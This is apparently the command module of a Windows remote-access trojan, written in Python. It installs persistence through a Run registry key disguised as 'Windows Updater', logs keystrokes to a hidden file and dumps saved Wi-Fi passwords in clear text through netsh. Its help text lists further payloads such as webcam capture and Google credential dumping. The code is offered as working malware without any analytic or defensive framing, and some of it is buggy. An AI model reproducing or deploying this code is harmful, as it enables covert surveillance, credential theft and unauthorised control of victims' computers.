import logging, ctypes
from sys import argv
from shlex import split
from pathlib import Path
from os.path import isfile
from getpass import getuser
from threading import Thread
from subprocess import getoutput, check_output
from pynput.keyboard import Listener
from platform import system as systemm
from shutil import copy2, move, rmtree
from win32api import GetLogicalDriveStrings, GetTempPath
from os import chdir, getcwd, startfile, system, mkdir, remove, rename
from winreg import OpenKey, CreateKey, CloseKey, SetValueEx, REG_SZ, HKEY_CURRENT_USER, KEY_WRITE

temp = GetTempPath()
current_filename = argv[0].split('\\')[-1]

def parameter_finder(recv):
    message = split(recv)
    message.remove(message[0])
    if len(message) == 1:
        return message[0]
    return message[:]

def backdoor():
    global backdoorins
    # check if user is admin
    if admin() != 0:
        pass

    # install backdoor
    try:
        copy2(current_filename, temp)
    except:
        pass
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    SetValueEx(key, "Windows Updater", 0, REG_SZ, f'{temp}{current_filename}')
    CloseKey(key)
    backdoorins = True

# ---------------------------
# Privleges
# ---------------------------

def admin():
    return ctypes.windll.shell32.IsUserAnAdmin()



# ---------------------------
# File system commands
# ---------------------------

def changedir(recv):
    cdir = parameter_finder(recv)
    chdir(cdir)
    return "Changed to " + getcwd()

def ls():
    return getoutput('dir')

def pwd():
    return getcwd()

def copy(recv):
    (opath, npath) = parameter_finder(recv)
    copy2(opath, npath)
    return "Copied file to " + npath

def cut(recv):
    (opath, npath) = parameter_finder(recv)
    move(opath, npath)
    return "Cut file to " + npath

def touchf(recv):
    name = parameter_finder(recv)
    Path(name).touch()
    return 'Created file ' + name

def mkd(recv):
    name = parameter_finder(recv)
    mkdir(name)
    return 'Made directory ' + name

def rename_file(recv):
    ofile, nfile = parameter_finder(recv)
    rename(ofile, nfile)
    return 'Renamed file successfully'

def rmd(recv):
    name = parameter_finder(recv)
    rmtree(name)
    return 'Removed directory ' + name

def rm(recv):
    name = parameter_finder(recv)
    remove(name)
    return 'Deleted ' + name

# ---------------------------
# System commands
# ---------------------------

def openfile(recv):
    file = parameter_finder(recv)
    startfile(file)
    return "Opened " + file

def lock():
    ctypes.windll.user32.LockWorkStation()
    return 'Locked PC'

def restart():
    system('shutdown /r')
    return "Restared computer successfully"

def shutdown():
    system('shutdown /p')
    return "Shutdown computer successfully"

logger = False
backdoorins = False
def info():
    drives = GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    return f"""
OS: {systemm()}
User: {getuser()}
Admin: {admin()}
Ip/Port: ip
Drives: {drives}
Backdoor installed: {backdoorins}
Keylogger started: {logger}
Dumped Chrome Passwords: 
Current Directory: {getcwd()}"""

# ---------------------------
# Payload commands
# ---------------------------

def keylogger_start():
    global logger
    if logger:
        return "Keylogger already started"
    Thread(target=keylogger).start()
    logger = True
    return "Keylogger started"

def wifi_dump():
    passwords = []

    data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    listnum = 0
    for i in profiles:
        results = check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            passwords.append({'SSID' : i, "Password" : results[0]})
        except IndexError:
            passwords.append({'SSID' : i, "Password" : ''})
        listnum + 1
    return str(passwords[:])

# ---------------------------
# Miscelaneous
# ---------------------------

def on_press(key):
    logging.info(str(key))
    logs = open('C:\\Users\\' + getuser() + '\\w.txt', 'a+')
    logs.write('\n' + str(key))

def keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def start_logging():
    if isfile('C:\\Users\\' + getuser() + '\\w.txt'):
        keylogger_start()

def help():
    return """
File system commands:
cd
cd ..
ls
pwd
copy
cut
touch
mkdir
rename
rmdir
rm

System commands:
open
lock
restart
shutdown
info

Payload commands:
webcam *
screen record *
keylogger start
keylogger dump
wifi dump
google dump *
upload
download"""

if __name__ == "__main__":
    exit(0)